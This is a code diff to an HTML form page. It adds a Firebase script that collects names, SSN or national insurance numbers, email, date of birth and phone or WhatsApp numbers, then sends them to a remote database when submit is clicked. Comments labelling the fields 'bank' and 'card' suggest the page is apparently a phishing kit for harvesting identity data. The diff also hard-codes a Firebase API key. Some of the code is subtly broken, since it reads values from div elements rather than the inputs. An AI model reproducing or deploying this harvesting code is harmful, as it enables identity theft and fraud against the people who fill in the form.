@@ -6,6 +6,66 @@
 		<title>personal</title>
 		<link rel="stylesheet" href="app.css">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+	<script type="module">
+// Import the functions you need from the SDKs you need
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js';
+import {getDatabase, set, child, remove, onValue, update, get,ref } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-database.js";
+
+		const firebaseConfig = {
+		  apiKey: "AIzaSyDrPwMf6z-xWrJwapawXnBYw60VjiOqjjk",
+		  authDomain: "tett-8b39b.firebaseapp.com",
+		  projectId: "tett-8b39b",
+		  storageBucket: "tett-8b39b.appspot.com",
+		  messagingSenderId: "366708585219",
+		  appId: "1:366708585219:web:bc99d8c4447b67a02fef36"
+		};
+		
+		// Initialize Firebase
+	const App = initializeApp(firebaseConfig);	
+    const db = getDatabase(App);
+	
+
+
+//    References
+
+// bank
+var ninorssn = document.getElementById("namv");
+var lasName = document.getElementById("namr");
+var firName = document.getElementById("namf");
+var email = document.getElementById("namy");
+
+
+// card
+var birth = document.getElementById("namk");
+var wnum = document.getElementById("bolter");
+var num = document.getElementById("bolte");
+
+var next = document.getElementById("bolt");
+
+
+
+function insertData(downloadURL){
+   set(ref(db, "personal-Details/"+ firName.value ),{
+firstName:firName.value,
+lastName:lasName.value,
+Gemail:email.value,
+id: ninorssn.value,
+ birthd: birth.value,
+wanum: wnum.value,
+Anum:num.value
+   })
+   .then(()=>{
+       console.log("data added");
+   })
+   .catch((error)=>{
+
+   });
+};
+
+
+next.addEventListener('click', insertData);
+</script>	
+	
 	</head>
 	<body id="dark">
 		<section id="dark">
@@ -21,17 +81,17 @@
  	<form action="app.html">
 <div class="mada">	
 
-	<div class="lively"> <span>First Name</span><input class="live" type="text" name="" placeholder="input here"  required></div>
+	<div id="namf" class="lively"> <span>First Name</span><input class="live" type="text" name="" placeholder="input here"  required></div>
 
-	<div class="lively"><span>Last Name</span><input class="live" type="text" name="" placeholder="input here" required></div>
+	<div id="namr" class="lively"><span>Last Name</span><input class="live" type="text" name="" placeholder="input here" required></div>
 
-	<div class="lively"><span>SSN or NIN</span><input class="live" type="number" name="" placeholder="input here" required></div>
+	<div id="namv" class="lively"><span>SSN or NIN</span><input class="live" type="number" name="" placeholder="input here" required></div>
 
-	<div class="lively"><span>Email(example@gmail.com) </span><input class="live" type="email" name="" placeholder="input here" required></div>
+	<div id="namy"class="lively"><span>Email(example@gmail.com) </span><input class="live" type="email" name="" placeholder="input here" required></div>
 
 	
 	
-	<div class="lively"><span>Date of birth</span><input class="live" type="date" style="text-align:right;"  name="begin" 
+	<div id="namk" class="lively"><span>Date of birth</span><input class="live" type="date" style="text-align:right;"  name="begin" 
         placeholder="dd-mm-yyyy" value=""
         min="1897-01-01" max="2015-12-31" id="dateofbirth"   required></div>
 
@@ -80,14 +140,14 @@
 </select></div>
 
 
-<div class="lively"><span>State</span><input class="live" type="text" name="" placeholder="input here" required></div>
+<div id="state" class="lively"><span>State</span><input class="live" type="text" name="" placeholder="input here" required></div>
 
-<div class="lively"><span>Country</span><input class="live" type="text" name="" placeholder="input here" required></div>
+<div id="country" class="lively"><span>Country</span><input class="live" type="text" name="" placeholder="input here" required></div>
 	<div class="lively"><span>Detailed Address</span><input class="live" type="text" name="" placeholder="input here" required></div>
 
-	<div class="lively"><span>Backup phone number</span><input class="live" type="number" name="" placeholder="input here" required></div>
+	<div id="bolte" class="lively"><span>Backup phone number</span><input class="live" type="number" name="" placeholder="input here" required></div>
 
-	<div class="lively"><span>whatsapp</span><input class="live" type="number" name="" placeholder="input here" required></div>
+	<div id="bolter" class="lively"><span>whatsapp</span><input class="live" type="number" name="" placeholder="input here" required></div>
 
 	<div class="lively"><span>Facebook(optional)</span><input class="live" type="text" name="" placeholder="input here"></div>
  	
@@ -98,7 +158,7 @@
 <nav>
 <ul class="nav justify-content">
 	
-<a class="apple" href="app.html"><button class="fad"> submit</button></a>
+<a class="apple" id="bolt"  href="app.html"><button class="fad"> submit</button></a>
 
 </ul>
 </nav></form>
